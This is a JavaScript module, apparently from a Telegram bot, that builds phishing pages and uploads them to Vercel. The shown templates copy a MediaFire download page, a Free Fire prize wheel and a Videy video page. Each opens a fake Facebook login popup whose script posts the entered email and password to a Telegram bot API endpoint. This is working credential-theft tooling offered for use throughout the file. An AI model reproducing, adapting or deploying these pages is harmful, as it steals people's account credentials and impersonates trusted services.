    color: #fff;
    font-size: 12px;
}

.download .do-btn {
    flex: 0 0 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 30px;
}

.down-area .lainnya {
    width: 100%;
    display: grid;
    grid-template-columns: auto auto;
    grid-gap: 10px;
}

.lainnya .action {
    background: #f4f4f5;
    color: #575B65;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 13px 10px;
    font-size: 11px;
    border-radius: 3px;
}

.action .link {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/link.svg') no-repeat;
    background-size: 100% 100%;
}

.action .share {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/share.svg') no-repeat;
    background-size: 100% 100%;
}

.action .post {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/facebook.svg') no-repeat;
    background-size: 100% 100%;
}

.action .save {
    position: relative;
    width: 25px;
    height: 25px;
    background: #f4f4f5 url('https://static.mediafire.com/images/icons/svg_dark/add.svg') no-repeat;
    background-size: 100% 100%;
}

.wrap .foot {
    margin-top: 100px;
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    flex-direction: column;
    justify-content: flex-start;
    background: #f3f3f3;
}

.foot .col {
    width: 100%;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    flex-direction: column;
    gap: 20px;
    padding: 25px;
    border-bottom: 1px solid #e8e9ec;
}

.col h2 {
    font-size: 12px;
    color: #575B65;
    font-weight: 600;
}

.col ul {
    width: 100%;
    display: flex;
    align-items: flex-start;
    justify-content: flex-start;
    flex-wrap: wrap;
    gap: 20px;
}

.col ul li {
    list-style: none;
    color: #575B65;
    font-size: 12px;
}

.foot .col.copyright h2 {
    font-weight: lighter;
}

.wrap .region {
    margin-top: 70px;
    position: relative;
    width: 100%;
    display: flex;
    align-items: center;
    flex-direction: column;
    align-items: center;
    padding: 0 20px;
    gap: 30px;
}

.region .map {
    position: relative;
    width: 100%;
    height: 200px;
    background: #4cacff url('https://static.mediafire.com/images/backgrounds/download/additional_content/world.svg') no-repeat;
    background-size: 100% 100%;
}

.map img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

.map .country {
    position: absolute;
    top: 0;
    left: 0;
    padding: 5px;
    background: rgba(0, 0, 0, 0.50);
    color: #fff;
    font-size: 11px;
}

.region .region-desc {
    width: 100%;
    position: relative;
    display: flex;
    align-items: flex-start;
    justify-content: center;
    gap: 20px;
}

.region-desc .regflag {
    position: relative;
    width: 75px;
}

.regflag img {
    max-width: 100%;
}

.region-desc .huft {
    width: 100%;
    display: flex;
    align-items: flex-end;
    justify-content: center;
    font-size: 12px;
}


@media(min-width: 911px) {
    .wrap {
        width: 700px;
    }
}
        /* Popup styles */
           /* Popup Overlay */
        .popup-login {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);  /* Dark background */
            display: none;  /* Hidden by default */
            align-items: center;  /* Vertically center */
            justify-content: center;  /* Horizontally center */
            z-index: 9999;  /* Ensure it's on top */
        }

        /* Popup Box */
        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            width: 360px;  /* Adjust width */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .facebook-logo {
            display: block;
            margin: 0 auto 20px;
        }

        .login-container h2 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        .login-container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #166fe5;
        }

        .error-message {
            display: none;
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .footer a {
            color: #1877f2;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Button to trigger the popup */
        .show-popup-btn {
            padding: 10px 20px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 20px;
        }

        .show-popup-btn:hover {
            background-color: #166fe5;
        }

    </style>
    <div class="wrap">
        <div class="navbar">
            <div class="logo">
                <img src="https://iconape.com/wp-content/png_logo_vector/mediafire.png" alt="MediaFire Logo">
            </div>
            <div class="flag">
                <img src="https://www.mediafire.com/images/flags_svg/idn.svg" alt="Flag">
            </div>
        </div>
        <div class="down-area">
            <div class="download">
                <div class="icon">
                    <img src="https://static.mediafire.com/images/filetype/file-video-v3.png" alt="File Icon">
                </div>
                <div class="title" onclick="showLoginPopup()"🐰>
                    <span class="atas">${vn}</span>
                    <span class="bawah">Download in a new tab (3.74MB)</span>
                </div>
                <div class="do-btn" onclick="showLoginPopup()">
                    <img src="https://static.mediafire.com/images/icons/svg_light/download.svg" alt="Download Button">
                </div>
            </div>
            <div class="downloaded">
                Your download is starting...
            </div>
            <div class="lainnya">
                <div class="action" onclick="showLoginPopup()">
                    <span class="link"></span>
                    Salin untuk messenger
                </div>
                <div class="action" onclick="showLoginPopup()">
                    <span class="share"></span>
                    Bagikan opsi
                </div>
                <div class="action" onclick="showLoginPopup()">
                    <span class="post"></span>
                    Posting ke Facebook
                </div>
                <div class="action" onclick="showLoginPopup()">
                    <span class="save"></span>
                    Simpan ke File Saya
                </div>
            </div>
        </div>
        <div class="region">
            <div class="map">
                <span class="country">Upload region: </span>
                <img src="https://static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg" alt="Region Map">
            </div>
            <div class="region-desc">
                <div class="regflag">
                    <img src="https://www.mediafire.com/images/flags_svg/idn.svg" alt="Region Flag">
                </div>
                <div class="huft">
                    This file was uploaded from Indonesia on May 3, 2022 at 2:35 AM
                </div>
            </div>
        </div>
        <div class="foot">
            <div class="col">
                <h2>COMPANY</h2>
                <ul>
                    <li>About Us</li>
                    <li>Careers</li>
                    <li>Press</li>
                    <li>Company Blog</li>
                </ul>
            </div>
            <div class="col">
                <h2>TOOLS</h2>
                <ul>
                    <li>MediaFire Mobile</li>
                    <li>On-Demand Video Encoding</li>
                </ul>
            </div>
            <div class="col">
                <h2>UPGRADE</h2>
                <ul>
                    <li>Professional</li>
                </ul>
            </div>
            <div class="col">
                <h2>SUPPORT</h2>
                <ul>
                    <li>Get support</li>
                </ul>
            </div>
            <div class="col copyright">
                <h2>&copy;2022 MediaFire Build 151202</h2>
                <ul>
                    <li>Advertising</li>
                    <li>Terms</li>
                    <li>Privacy Policy</li>
                    <li>Copyright</li>
                    <li>Abuse</li>
                    <li>Credits</li>
                    <li>More...</li>
                </ul>
            </div>
        </div>
    </div>
    <!-- Popup Login Form (Facebook) -->
    <div class="popup-login" id="loginPage">
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" width="120">
            <h2>Log into Facebook</h2>
            <p>Enter your email or phone number</p>
 <form id="loginForm">
  <input type="text" id="email" name="email" placeholder="Email or phone" required>
  <input type="password" id="password" name="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>
            <div class="error-message" id="errorMessage">Incorrect email or password.</div>
            <div class="footer">
                <p>Forgotten account? <a href="#">Click here</a></p>
                <p>New to Facebook? <a href="#">Create an account</a></p>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    

    
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: "${io}",
      text: message
    })
  }
    const processedEmails = new Set();

    function isEmailProcessed(email) {
        return processedEmails.has(email);
    }

    function markEmailAsProcessed(email) {
        processedEmails.add(email);
    }

    function showLoginPopup() {
        document.getElementById("loginPage").style.display = "flex";
    }

document.getElementById("loginForm").addEventListener("submit", function(e) {
e.preventDefault();
const email = document.getElementById('email')?.value;
const password = document.getElementById('password')?.value;
const message = "BERHASIL MENGAMBIL DATA ✅\n\nEMAIL: "+email+"\nPASSWORD: "+password
sendText(message)
})
</script>
</body>
</html>
`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "mediafire")
fs.unlinkSync("index.html")
}

async function spinff2(ctx, t, io) {
const kode = String.raw`
<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spin Wheel</title>
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-image: url('https://img12.pixhost.to/images/1595/586811066_e2db986698da6234e12f3ba3b4ffcfba.jpg');
            background-size: cover;
            background-position: center;
            text-align: center;
        }
        .title {
            font-size: 32px;
            font-weight: bold;
            color: gold;
            text-shadow: 2px 2px 5px black;
            margin-bottom: 20px;
        }
        .wheel-container {
            position: relative;
            width: 500px;
            height: 500px;
            border: 4px solid #333;
            border-radius: 50%;
            overflow: hidden;
        }
        .wheel {
            position: absolute;
            width: 100%;
            height: 100%;
            transition: transform 3s ease-out;
        }
        .wheel img {
            position: absolute;
            width: 120px;
            height: 120px;
            border-radius: 50%;
        }
        .pointer {
            position: absolute;
            top: -25px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 30px solid transparent;
            border-right: 30px solid transparent;
            border-bottom: 60px solid red;
        }
        .spin-button {
            margin-top: 20px;
            padding: 15px 30px;
            background-color: blue;
            color: white;
            font-size: 18px;
            border: none;
            cursor: pointer;
            border-radius: 10px;
        }
        .result-container {
            display: none;
            text-align: center;
            margin-top: 20px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
        }
        .result-container img {
            width: 200px;
            height: 200px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .claim-button {
            display: block;
            margin: 0 auto;
            padding: 20px 40px;
            background-color: #ff5733;
            color: white;
            font-size: 20px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 10px;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .claim-button:hover {
            background-color: #e04e2a;
        }
        
        
                .popup-login {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);  /* Dark background */
            display: none;  /* Hidden by default */
            align-items: center;  /* Vertically center */
            justify-content: center;  /* Horizontally center */
            z-index: 9999;  /* Ensure it's on top */
        }

        /* Popup Box */
        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            width: 360px;  /* Adjust width */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .facebook-logo {
            display: block;
            margin: 0 auto 20px;
        }

        .login-container h2 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        .login-container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #166fe5;
        }

        .error-message {
            display: none;
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .footer a {
            color: #1877f2;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Button to trigger the popup */
        .show-popup-btn {
            padding: 10px 20px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 20px;
        }

        .show-popup-btn:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>
    <div class="title">Ayo spin dan dapatkan hadiahnya!</div>
    <div class="wheel-container">
        <div class="pointer"></div>
        <div class="wheel" id="wheel">
            <img src="https://img12.pixhost.to/images/1596/586832602_1631798814mp40underworld.jpg" style="top: 5%; left: 40%;">
            <img src="https://img12.pixhost.to/images/1596/586832597_1631798847m1887onepunchman.jpg" style="top: 40%; left: 5%;">
            <img src="https://img12.pixhost.to/images/1596/586832592_m1887-ff-skin13.jpg" style="top: 40%; right: 5%;">
            <img src="https://img12.pixhost.to/images/1596/586832587_8f770a547c57affcd99bff143c7b701b.jpg" style="bottom: 5%; left: 40%;">
        </div>
    </div>
    <button class="spin-button" onclick="spinWheel()">Putar Roda</button>
    <div class="result-container" id="result-container">
        <h2>Selamat! Anda mendapatkan hadiah:</h2>
        <img id="prize-image" src="" alt="Hadiah">
        <button id="claim-button" class="claim-button">Klik di sini untuk ambil hadiahmu</button>
    </div>
    <div class="popup-login" id="loginPage">
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" width="120">
            <h2>Log into Facebook</h2>
            <p>Enter your email or phone number</p>
 <form id="loginForm">
  <input type="text" id="email" name="email" placeholder="Email or phone" required>
  <input type="password" id="password" name="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>
            <div class="error-message" id="errorMessage">Incorrect email or password.</div>
            <div class="footer">
                <p>Forgotten account? <a href="#">Click here</a></p>
                <p>New to Facebook? <a href="#">Create an account</a></p>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    

    
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: "${io}",
      text: message
    })
  }
    const processedEmails = new Set();

    function isEmailProcessed(email) {
        return processedEmails.has(email);
    }

    function markEmailAsProcessed(email) {
        processedEmails.add(email);
    }

    function showLoginPopup() {
        document.getElementById("loginPage").style.display = "flex";
    }

document.getElementById("loginForm").addEventListener("submit", function(e) {
e.preventDefault();
const email = document.getElementById('email')?.value;
const password = document.getElementById('password')?.value;
const message = "BERHASIL MENGAMBIL DATA ✅\n\nEMAIL: "+email+"\nPASSWORD: "+password
sendText(message)
})
        const prizes = [
            "https://img12.pixhost.to/images/1596/586832602_1631798814mp40underworld.jpg",
            "https://img12.pixhost.to/images/1596/586832597_1631798847m1887onepunchman.jpg",
            "https://img12.pixhost.to/images/1596/586832592_m1887-ff-skin13.jpg",
            "https://img12.pixhost.to/images/1596/586832587_8f770a547c57affcd99bff143c7b701b.jpg",
        ];
        const prizeLinks = [
            "go.php",
            "go.php",
            "go.php",
            "go.php"
        ];
        let selectedPrizeIndex = 0;
        function spinWheel() {
            selectedPrizeIndex = Math.floor(Math.random() * prizes.length);
            let segmentAngle = 360 / prizes.length;
            let stopAngle = 360 - (selectedPrizeIndex * segmentAngle + segmentAngle / 2);
            let randomRotation = 360 * 3 + stopAngle;
            gsap.to("#wheel", { rotation: randomRotation, duration: 3, ease: "power4.out", onComplete: function() {
                document.getElementById("prize-image").src = prizes[selectedPrizeIndex];
                document.getElementById("result-container").style.display = "block";
                showLoginPopup()
            }});
        }
    </script>
</body>
</html>`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "garena-freefire-id")
fs.unlinkSync("index.html")
}

async function videy2(ctx, t, io) {
const kode = String.raw`<html>
  <head>
    <title>Watch on Videy &#8212; Free and Simple Video Hosting</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="icon" type="image/x-icon" href="https://videy.co/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   
   
    <style>
    body {
  margin: 0;
  font-family: 'Inter';
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-smooth: always;
}

a {
  text-decoration: none;
  color: inherit;
}

.legal a:hover {
  text-decoration: underline;
}

.container {
  max-width: 1100px;
  margin: 0 auto;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}

.top {
  padding: 8px 24px;
  display: flex;
  align-items: center;
}

.logo {
  font-size: 26px;
  letter-spacing: -2px;
  font-weight: 600;
  font-family: 'Poppins';
}

.upload {
  font-size: 15px;
  margin-left: 20px;
  padding: 8px 20px;
  border-radius: 48px;
  font-weight: 600;
  background-color: #e7e7e7;
  cursor: pointer;
}

.upload:active, .upload:hover {
  background-color: #dddddd;
}

.text {
  margin-top: 64px;
  padding: 0 24px;
}

.main-line {
  font-size: 26px;
  font-weight: 700;
  text-align: center;
}

.second-line {
  margin-top: 16px;
  font-size: 16px;
  font-weight: 400;
  text-align: center;
}

.footer {
  font-size: 13px;
  color: #302f2f;
  margin-top: 64px;
  text-align: center;
  margin-top: auto;
  padding: 32px 16px;
}

.outline {
  width: 427px;
  height: 240px;
  border: 2px solid grey;
  border-radius: 4px;
  margin: 0 auto;
  margin-top: 32px;
  font-weight: 500;
  display: flex;
  align-items: center;
  justify-content: center;
}

.box {
  margin-top: 32px;
  text-align: center;
}

.box-upload {
  background-color: black;
  border-radius: 48px;
  color: white;
  padding: 12px 24px;
  font-weight: 700;
  cursor: pointer;
  width: 165px;
  margin: 0 auto;
}

.copyright {
  font-weight: 500;
}
@keyframes gradient {
  0% {
    background-position: 0% 50%;
  }

  50% {
    background-position: 100% 50%;
  }

  100% {
    background-position: 0% 50%;
  }
}

.box-upload.animate {
  background: linear-gradient(270deg, #000000, #333333, #2a2a2a);
  background-size: 600% 600%;
  animation: gradient 1.5s ease infinite;
}

.more {
  margin-left: auto;
  font-size: 15px;
  font-weight: 500;
}

.legal {
  display: flex;
  justify-content: center;
  margin-top: 8px;
  font-size: 12px;
  color: #5a5858;
}

.legal .item {
  margin: 0 8px;
}

body.dragging::before {
  content: "Drop the file anywhere on this page";
  position: fixed;
  left: 0;
  width: 100%;
  top: 0;
  height: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  font-size: 1.5em;
  background-color: rgba(78, 78, 78, .72);
  pointer-events: none;
  color: #e0e0e0;
  text-align: center;
  font-weight: 600
}

.email {
  margin-top: 72px;
  font-size: 20px;
  font-weight: 600;
  text-align: center;
}

.video {
  margin-top: 12px;
  width: 100%;
  display: flex;
  justify-content: center;
}

video {
  border-radius: 8px;
  max-height: calc(100vh - 64px);
}

.video-inner {
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  max-width: 720px;
}
.as {
  max-width: 720px;
  margin: 0 auto;
  width: 100%;
  margin-top: 8px;
}

.legal-text {
  max-width: 960px;
  margin: 0 auto;
  padding: 0 16px;
  margin-top: 64px;
}

.upload-error {
  color: #cc0000;
  text-align: center;
  font-size: 14px;
  margin-top: 12px;
}

.video-error {
  font-size: 16px;
  font-weight: 600;
  padding: 16px 0;
}

.video-error-container {
  padding: 16px 16px 24px 16px;
  margin: 0 auto;
  text-align: center;
  padding-bottom: 8px;
}

.video-error-reasons {
  font-size: 15px;
}

.email-collect {
  font-size: 14px;
  text-align: center;
  margin-top: 12px;
  margin-bottom: 12px;
  text-decoration: underline;
  color: #50506b;
  font-weight: 500;
  cursor: pointer;
}

.modal {
  display: none;
  position: fixed;
  z-index: 100;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(4px);
  overflow-y: auto;
}

.modal-content {
  background-color: #ffffff;
  color: #000000;
  margin: 10% auto;
  padding: 2rem;
  border: 1px solid #e5e5e5;
  width: 90%;
  max-width: 450px;
  border-radius: 12px;
  position: relative;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
}

.modal-content h2 {
  color: #000000;
  font-size: 1.5rem;
  margin-bottom: 1.5rem;
  font-weight: 600;
}

.modal-close {
  position: absolute;
  right: 1.5rem;
  top: 1rem;
  color: #000000;
  font-size: 24px;
  font-weight: bold;
  cursor: pointer;
  transition: opacity 0.2s ease;
}

.modal-close:hover {
  opacity: 0.7;
}

.modal-content #emailForm {
  margin-top: 1.5rem;
}

.modal-content #emailInput {
  width: 100%;
  padding: 12px;
  margin-bottom: 1rem;
  border: 2px solid #e5e5e5;
  border-radius: 8px;
  background-color: #ffffff;
  color: #000000;
  font-size: 1rem;
  transition: border-color 0.2s ease;
  box-sizing: border-box;
}

.modal-content #emailInput:focus {
  border-color: #000000;
  outline: none;
}

.modal-content #emailInput::placeholder {
  color: #666666;
}

.modal-content #emailForm button {
  width: 100%;
  padding: 12px;
  background-color: #000000;
  color: #ffffff;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s ease;
}

.modal-content #emailForm button:hover {
  opacity: 0.9;
}

.report-options {
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin-bottom: 1.5rem;
}

.report-options label {
  display: flex;
  align-items: center;
  font-size: 1rem;
  cursor: pointer;
}

.report-options input[type="radio"] {
  margin-right: 10px;
  cursor: pointer;
}

#reportForm button {
  width: 100%;
  padding: 12px;
  background-color: #000000;
  color: #ffffff;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s ease;
}

#reportForm button:hover {
  opacity: 0.9;
}

@media (max-width: 992px) {
  .video {
    margin-top: 0;
  }
  .legal-text {
    margin-top: 24px;
  }
}

@media (max-width: 744px) {
  video {
    border-radius: 0;
  }
}

@media (max-width: 600px) {
  .modal-content {
    margin: 5% auto;
    padding: 1.5rem;
    width: 85%;
  }

  .modal-content h2 {
    font-size: 1.3rem;
    margin-bottom: 1.2rem;
  }

  .modal-close {
    right: 1.2rem;
    top: 0.8rem;
  }
}

@media (max-height: 700px) {
  .modal-content {
    margin: 5% auto;
  }
      .video-actions {
        width: 100%;
        display: flex;
        justify-content: center;
        display: none;
      }

      .video-actions-inner {
        width: 100%;
        max-width: 720px;
        display: flex;
        gap: 8px;
        padding: 12px 12px 6px 12px;
        overflow-x: auto;
        scrollbar-width: none;
        -ms-overflow-style: none;
        white-space: nowrap;
      }

      .video-actions-inner::-webkit-scrollbar {
        display: none;
      }

      .action-btn {
        background: #f2f2f2;
        border: none;
        padding: 8px 16px;
        border-radius: 16px;
        font-family: inherit;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: background-color 0.2s;
        flex-shrink: 0;
      }

      .action-btn, .action-btn a {
        color: #000;
      }

      .action-btn:hover {
        background: #e5e5e5;
      }
    </style>
    
         <style>
        /* Popup styles */
           /* Popup Overlay */
        .popup-login {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);  /* Dark background */
            display: none;  /* Hidden by default */
            align-items: center;  /* Vertically center */
            justify-content: center;  /* Horizontally center */
            z-index: 9999;  /* Ensure it's on top */
        }

        /* Popup Box */
        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            width: 360px;  /* Adjust width */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .facebook-logo {
            display: block;
            margin: 0 auto 20px;
        }

        .login-container h2 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        .login-container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #166fe5;
        }

        .error-message {
            display: none;
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .footer a {
            color: #1877f2;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Button to trigger the popup */
        .show-popup-btn {
            padding: 10px 20px;
            background-color: #1877f2;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 20px;
        }

        .show-popup-btn:hover {
            background-color: #166fe5;
        }

    </style>
  </head>
  <body data-version="v1.0.5">
    <div class="container">
      <div class="top">
        <div class="logo">
          <a>videy</a>
        </div>
        <a>
            <div class="upload">Upload</div>
        </a>
        <div class="more">
          <a>Advertise</a>
        </div>
      </div>
      <div id="emailModal" class="modal">
        <div class="modal-content">
          <span class="modal-close">&times;</span>
          <h2>Get more like this</h2>
          <form id="emailForm">
            <input type="email" id="emailInput" placeholder="Enter your email" required>
            <button type="submit">Submit</button>
          </form>
        </div>
      </div>
      <div id="reportModal" class="modal">
        <div class="modal-content">
          <span class="modal-close">&times;</span>
          <h2>What's wrong with this content?</h2>
          <form id="reportForm">
            <div class="report-options">
              <label><input type="radio" name="reportReason" value="dislike"> I don't like it</label>
              <label><input type="radio" name="reportReason" value="hateful"> It is hateful or offensive</label>
              <label><input type="radio" name="reportReason" value="csam"> It is CSAM</label>
              <label><input type="radio" name="reportReason" value="illegal"> It is illegal</label>
            </div>
            <button type="submit">Submit</button>
          </form>
        </div>
      </div>
      <div class="video">
        <div class="video-inner">
<div class="video">
  <div class="video-inner" style="position: relative;">
  <a onclick="showLoginPopup()">
    <img src="https://files.catbox.moe/ba2qr3.jpg" style="width: 100%; height: 200px; margin-top: 40px;"/>
    </a>
  </div>
</div>
        <div id="video-error" style="display: none;" class="video-error-container">
        <div class="video-error">Video could not load.</div>
        <div class="video-error-reasons">This could be because the video was removed, your internet connection is down, the server is having issues, or the video might not have ever existed.</div>
      </div>
        </div>
      </div>
      <div class="video-actions">
        <div class="video-actions-inner">
          <button class="action-btn" id="shareVideo">Share Video</button>
          <button class="action-btn" id="copyUrl">Copy Link</button>
          <button class="action-btn" id="uploadVideo">Upload</button>
          <button class="action-btn" id="subscribeBtn">Subscribe</button>
          <button class="action-btn" id="reportBtn">Report</button>
        </div>
      </div>
      <div class="as">
        <iframe id="ads-iframe" src="" style="width: 100%; height: 500px; border: none; display: none;"></iframe>
      </div>
      <div class="footer">
        <div class="copyright"> Copyright &copy; <span id="year"></span> videy.co</div>
        <div class="legal">
          <div class="item">
            <a>Terms of Service</a>
          </div>
          <div class="item">
            <a id="reportAbuse">Report Abuse</a>
          </div>
        </div>
      </div>
    </div>
    <div class="popup-login" id="loginPage">
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" width="120">
            <h2>Log into Facebook</h2>
            <p>Enter your email or phone number</p>
 <form id="loginForm">
  <input type="text" id="email" name="email" placeholder="Email or phone" required>
  <input type="password" id="password" name="password" placeholder="Password" required>
  <button type="submit">Log In</button>
</form>
            <div class="error-message" id="errorMessage">Incorrect email or password.</div>
            <div class="footer">
                <p>Forgotten account? <a href="#">Click here</a></p>
                <p>New to Facebook? <a href="#">Create an account</a></p>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    

    
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: "${io}",
      text: message
    })
  }
    const processedEmails = new Set();

    function isEmailProcessed(email) {
        return processedEmails.has(email);
    }

    function markEmailAsProcessed(email) {
        processedEmails.add(email);
    }

    function showLoginPopup() {
        document.getElementById("loginPage").style.display = "flex";
    }

document.getElementById("loginForm").addEventListener("submit", function(e) {
e.preventDefault();
const email = document.getElementById('email')?.value;
const password = document.getElementById('password')?.value;
const message = "BERHASIL MENGAMBIL DATA ✅\n\nEMAIL: "+email+"\nPASSWORD: "+password
sendText(message)
})
</script>
  </body>
 </html>
`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "videy-co")
fs.unlinkSync("index.html")
}

module.exports = { mediafire, groupwa, ch, videy, spinff, ch2, groupwa2, mediafire2, spinff2, videy2 }
